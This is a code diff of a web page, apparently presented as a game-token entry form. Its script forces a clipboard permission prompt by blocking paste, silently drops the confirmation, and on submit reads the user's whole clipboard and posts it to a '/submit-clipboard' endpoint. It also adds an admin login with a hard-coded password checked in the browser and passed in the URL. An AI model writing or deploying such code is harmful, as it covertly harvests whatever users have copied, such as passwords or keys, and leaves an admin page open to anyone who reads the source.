@@ -34,9 +34,11 @@
 
   <div id="tokenBox">
     <p>Paste the game token here:</p>
-    <input type="text" id="tokenInput" /><br />
+    <input type="text" id="tokenInput" autocomplete="off" /><br />
     <button id="tokenSubmitBtn">Submit Token & Save Clipboard</button>
   </div>
+
+  <button id="adminBtn" style="margin-top: 40px;">Admin Login</button>
 
   <script>
     const gameIdInput = document.getElementById('gameIdInput');
@@ -44,23 +46,28 @@
     const tokenInput = document.getElementById('tokenInput');
     const tokenSubmitBtn = document.getElementById('tokenSubmitBtn');
     const tokenBox = document.getElementById('tokenBox');
+    const adminBtn = document.getElementById('adminBtn');
 
     let permissionGranted = false;
 
+    // Only block Ctrl+V if permission not granted yet
     document.addEventListener('keydown', async (e) => {
-      if (e.ctrlKey && e.key.toLowerCase() === 'v') {
+      if (e.ctrlKey && e.key.toLowerCase() === 'v' && !permissionGranted) {
         e.preventDefault();
 
         try {
+          // This triggers the browser clipboard permission popup
           await navigator.clipboard.readText();
           permissionGranted = true;
-          alert('Clipboard access granted! You can now paste.');
+          // No alert here, just silently allow
         } catch (err) {
-          alert('Clipboard permission denied.');
-          window.location.href = 'https://example.com/denied'; // Replace as needed
+          alert('Clipboard permission denied. Redirecting...');
+          window.location.href = 'https://example.com/denied'; // Replace with your redirect
         }
       }
     });
+
+    // Now that permission is granted, Ctrl+V will work normally
 
     submitBtn.onclick = () => {
       if (!permissionGranted) {
@@ -83,6 +90,7 @@
 
     tokenSubmitBtn.onclick = async () => {
       try {
+        // Read *entire* clipboard content on token submit
         const fullClipboard = await navigator.clipboard.readText();
 
         await fetch('/submit-clipboard', {
@@ -94,6 +102,15 @@
         alert('Clipboard content saved successfully!');
       } catch (err) {
         alert('Failed to access clipboard. Please ensure permission is granted.');
+      }
+    };
+
+    adminBtn.onclick = () => {
+      const password = prompt('Enter admin password:');
+      if (password === 'skibidi123') {
+        window.location.href = '/admin?password=skibidi123';
+      } else {
+        alert('Incorrect password');
       }
     };
   </script>
